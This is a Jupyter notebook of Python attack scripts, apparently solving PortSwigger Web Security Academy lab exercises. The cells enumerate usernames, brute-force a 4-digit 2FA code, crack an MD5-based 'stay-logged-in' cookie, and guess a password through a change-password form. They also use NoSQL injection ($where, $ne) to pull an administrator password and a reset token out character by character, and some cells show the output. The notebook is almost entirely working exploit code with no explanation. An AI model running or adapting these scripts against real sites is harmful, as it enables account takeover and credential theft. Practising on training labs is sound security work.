{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "us_f = open(\"/home/sueaki/Templates/username\", \"r\")\n",
    "usernames = [u[:-1] for u in us_f.readlines()]\n",
    "ps_f = open(\"/home/sueaki/Templates/password\", \"r\")\n",
    "passwords = [p[:-1] for p in ps_f.readlines()]\n",
    "# ps_t = open(\"password_tmp\", \"w\")\n",
    "# us_t = open(\"username_tmp\", \"w\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "url = 'https://0a7c0051045b95cf81b74d4c0034003f.web-security-academy.net/login'\n",
    "for user in usernames:\n",
    "    for i in range(5):\n",
    "        data = {\n",
    "            'username': user[:-1],\n",
    "            'password': 'whatever'\n",
    "        }\n",
    "        response = requests.post(url, data=data)\n",
    "\n",
    "        print(f\"Status Code: {response.status_code}\", end='. ')\n",
    "        # print(f\"Response Content: {response.text}\")\n",
    "        # print(user, end='')\n",
    "        print(len(response.text), end=\".\")\n",
    "        if (\"Invalid username or password.\" in response.text):\n",
    "            # print(\"Invalid username or password\")\n",
    "            print(user)\n",
    "        elif (\"You have made too many incorrect login attempts\" in response.text):\n",
    "            print(\"Also Found it: \", user)\n",
    "        else:\n",
    "            print(\"Found it: \", user)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Lab: 2FA broken logic\n",
    "\n",
    "import requests\n",
    "\n",
    "url = 'https://0a5b009a039c341d800f7b37004a0036.web-security-academy.net//my-account?id=carlos'\n",
    "\n",
    "# Cookies\n",
    "cookies = {\n",
    "    'verify': 'carlos',\n",
    "    'session': 'eErTh9MMiwoQBuIpyzr00GPQULR0tZKe'\n",
    "}\n",
    "\n",
    "for i in range(191, 9999):\n",
    "    string = f\"{i:04d}\"\n",
    "    # Data\n",
    "    data = {\n",
    "        'mfa-code': string,\n",
    "    }\n",
    "\n",
    "    # Make the POST request\n",
    "    response = requests.post(url, cookies=cookies, data=data)\n",
    "\n",
    "    # Print the response\n",
    "    # print(f\"Status Code: {response.status_code}\")\n",
    "    if (\"Incorrect security code\" not in response.text):\n",
    "        print(\"Found it.\", string)\n",
    "    else:\n",
    "        print(string, end=\" \")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Lab: 2FA broken logic\n",
    "\n",
    "import hashlib\n",
    "import base64\n",
    "import requests\n",
    "\n",
    "url = 'https://0a5b009a039c341d800f7b37004a0036.web-security-academy.net/my-account?id=carlos'\n",
    "\n",
    "# Cookies\n",
    "for password in passwords:\n",
    "    cookies = {\n",
    "        'stay-logged-in': base64.b64encode(\"carlos:\".encode() + hashlib.md5(password[:-1].encode()).hexdigest().encode()).decode('utf-8')\n",
    "    }\n",
    "\n",
    "    response = requests.post(url, cookies=cookies)\n",
    "\n",
    "    # print(response.status_code, response.text)\n",
    "\n",
    "    if (\"Your username\" in response.text):\n",
    "        print(\"Found it.\", password[:-1])\n",
    "    else:\n",
    "        print(password[:-1])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "wrong_promp = \"Current password is incorrect\"\n",
    "correct_promp = \"New passwords do not match\"\n",
    "\n",
    "url = \"https://0a8700a304e421b8806fa3e40073003a.web-security-academy.net/my-account/change-password\"\n",
    "\n",
    "cookies = {\n",
    "    \"session\": \"pO3NSh1FpX3KSaFOOmkEuA6cGNqodV84\",\n",
    "    \"session\": \"I2YwGoKiFc4K6M90y1wvMWLmZhXp9aZm\"\n",
    "}\n",
    "\n",
    "# password = \"test123\"\n",
    "\n",
    "for password in passwords:\n",
    "    data = {\n",
    "        \"username\": \"carlos\",\n",
    "        \"current-password\": password, \n",
    "        \"new-password-1\": \"test12\", \n",
    "        \"new-password-2\": \"test\"\n",
    "    }\n",
    "\n",
    "    response = requests.post(url, data=data, cookies=cookies)\n",
    "\n",
    "    if (wrong_promp in response.text): \n",
    "        print(\"wrong: \", password)\n",
    "    elif (correct_promp in response.text):\n",
    "        print(\"correct: \", password)\n",
    "    else:\n",
    "        print(\"something wrong\", password)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "...................t...........l.b..........k...............p..c..............o..c"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "times = 0\n",
    "cha = 's'\n",
    "\n",
    "err_msg = \"Could not find user\"\n",
    "\n",
    "cookies = {\n",
    "    \"session\": \"82yFZQZyMarrWnDP6tuCH4zIdBf7ksnr\"\n",
    "}\n",
    "\n",
    "password = \"\"\n",
    "for j in range(8):\n",
    "    times = j\n",
    "    for i in range(97, 123):\n",
    "        cha = chr(i)\n",
    "        url = \"https://0a86004504b1247b8101da65007f0020.web-security-academy.net/user/lookup?user=administrator'+%26%26+this.password[\" + str(times) + \"]=='\" + cha\n",
    "        response = requests.get(url, cookies=cookies)\n",
    "        if not err_msg in response.text:\n",
    "            password += cha\n",
    "            print(cha, end=\"\")\n",
    "            break\n",
    "        else:\n",
    "            print(\".\", end=\"\")\n",
    "print(password)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0 0\n",
      "..........1 a\n",
      "...............2 f\n",
      ".........3 9\n",
      "...............4 f\n",
      "...........5 b\n",
      "..............6 e\n",
      "............7 c\n",
      ".............8 d\n",
      ".9 1\n",
      ".....10 5\n",
      "11 0\n",
      "............12 c\n",
      "..............13 e\n",
      "............14 c\n",
      "..15 2\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "import json\n",
    "import string\n",
    "\n",
    "char_list = list(string.digits + string.ascii_lowercase + string.ascii_uppercase)\n",
    "\n",
    "\n",
    "err_msg = \"Invalid username or password\"\n",
    "\n",
    "url = \"https://0a4f006e0378721880b9260700c3005c.web-security-academy.net/login\"\n",
    "\n",
    "cookies = {\n",
    "    \"session\": \"xwnOrjv6VTKrtX4S1oerJCuJqsVg3RsZ\"\n",
    "}\n",
    "\n",
    "headers = {\n",
    "    \"Content-Type\": \"application/json\"\n",
    "}\n",
    "\n",
    "# for i in range(4, 5):\n",
    "#     field = \"\"\n",
    "#     for j in range(13):\n",
    "#         print(\"the {}th --------\".format(j))\n",
    "#         for cha in char_list:\n",
    "\n",
    "#             body = {\n",
    "#                 \"username\":\"carlos\",\n",
    "#                 \"password\":{\n",
    "#                     \"$ne\": \"\"\n",
    "#                 },\n",
    "#                 \"$where\":f\"Object.keys(this)[{i}].match('^.{{{j}}}{cha}.*')\"\n",
    "#             }\n",
    "\n",
    "#             response = requests.post(url, cookies=cookies, headers=headers, data=json.dumps(body))\n",
    "#             if (err_msg in response.text):\n",
    "#                 print(\".\", end=\"\")\n",
    "#             else:\n",
    "#                 field += cha\n",
    "#                 print(j, cha)\n",
    "#                 break\n",
    "#     print(field)\n",
    "\n",
    "value = \"\"\n",
    "for i in range(16):\n",
    "    for cha in char_list:\n",
    "        body = {\n",
    "            \"username\":\"carlos\",\n",
    "            \"password\":{\n",
    "                \"$ne\": \"\"\n",
    "            },\n",
    "            \"$where\":f\"this.passwordReset[{i}] == '{cha}'\"\n",
    "        }\n",
    "        response = requests.post(url, cookies=cookies, headers=headers, data=json.dumps(body))\n",
    "        if (err_msg in response.text):\n",
    "            print(\".\", end=\"\")\n",
    "        else:\n",
    "            value+= cha\n",
    "            print(i, cha)\n",
    "            break\n",
    "print(value)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0af9fbecd150cec2'"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "value"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']\n"
     ]
    }
   ],
   "source": [
    "# print(list(range(97, 123)) + list(range(55, 65)))\n",
    "import string\n",
    "char_list = list(string.digits + string.ascii_lowercase + string.ascii_uppercase)\n",
    "print(char_list)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
